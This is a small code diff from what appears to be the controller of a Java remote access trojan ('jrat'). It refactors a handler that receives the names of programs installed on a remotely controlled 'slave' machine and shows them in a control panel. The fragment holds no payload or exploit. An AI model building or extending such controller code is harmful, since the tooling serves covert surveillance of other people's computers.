@@ -4,13 +4,11 @@ import jrat.controller.Slave;
 import jrat.controller.ui.frames.FrameControlPanel;
 import jrat.controller.ui.panels.PanelControlInstalledPrograms;
 
-import java.io.DataInputStream;
-
 
 public class Packet55InstalledProgram extends AbstractIncomingPacket {
 
 	@Override
-	public void read(Slave slave, DataInputStream dis) throws Exception {
+	public void read(Slave slave) throws Exception {
 		String program = slave.readLine();
 
 		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
